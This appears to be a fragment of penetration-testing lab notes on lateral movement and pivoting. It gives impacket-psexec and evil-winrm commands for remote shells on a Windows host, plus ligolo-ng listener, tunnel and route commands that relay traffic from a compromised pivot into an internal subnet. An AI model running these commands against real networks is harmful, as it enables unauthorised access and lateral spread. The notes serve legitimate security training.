```bash
impacket-psexec [user]:[password]@172.16.5.19
```

![image](https://github.com/user-attachments/assets/b7b9230c-a1c6-4b96-aae7-e353d038ec90)

- Or use evil-winrm-:

```bash
evil-winrm -i [ip] -u [user] -p [password]
```
![image](https://github.com/user-attachments/assets/d0f505ae-bde6-478f-8376-4370696576a8)

- Uploading with evil-winrm

![image](https://github.com/user-attachments/assets/d0882935-b995-4a26-8fc5-20f233b13ad1)

- Knowing that the windows host cannot communicate directly with us, we’re going to setup a listener on the linux pivot using the listener_add command. This listener will redirect the traffic received by the linux host to our attacker machine.

```ligolo-ng
listener_add --addr [pivot-host which is the host that got compromised at first]:8001 --to 0.0.0.0:8001
```
![image](https://github.com/user-attachments/assets/367a6b24-95fb-4713-b880-ad4664b361cb)

- File transfer on host `5.19`

![image](https://github.com/user-attachments/assets/b8145236-774a-4fb6-b8ac-938f20508bfc)

- You need to also create another listener to connect to ligolo on port `11601`-:

![image](https://github.com/user-attachments/assets/9549a172-b08d-4c20-b274-fd43720b1375)

- Now connect-:

![image](https://github.com/user-attachments/assets/d47504ce-2d3a-4bc4-ab93-6cbcd7877a17)

- Use session 2 with `session` by using arrow keys-:

![image](https://github.com/user-attachments/assets/a0f1a0ad-9a20-4436-a71a-959ba9b95fea)

- Access to host on route `172.16.6.*`

![image](https://github.com/user-attachments/assets/27f38ba5-bbbe-4a90-af44-14c0747de124)

- Create a new interface and start a tunnel-:

```ligolo-ng
ifcreate --name ligolo1
tunnel_start --tun ligolo1
route_add --name ligolo1 --route 172.16.6.0/24
```
![image](https://github.com/user-attachments/assets/52743ba0-5136-484f-ab1e-dae98d81ea4c)

- Removing a route-:

```bash
sudo ip route del 172.16.0.0/16 dev ligolo
```

- Host on `172.16.6.155` with rdp-:

![image](https://github.com/user-attachments/assets/35a43da0-190a-483f-ad7a-108693719101)

- Editing the bind address, find `ligolo-ng.yaml` and edit

<img width="1303" height="360" alt="image" src="https://github.com/user-attachments/assets/3c1678c3-7dd7-4be2-b7d0-ef3bd90ef8ff" />

- Run with-:

```bash
ligolo-ng -selfcert config ligolo-ng.yaml
```

<img width="1144" height="377" alt="image" src="https://github.com/user-attachments/assets/fba98849-4c37-428e-9f8c-5d6bf98d7c5c" />


-------------------


















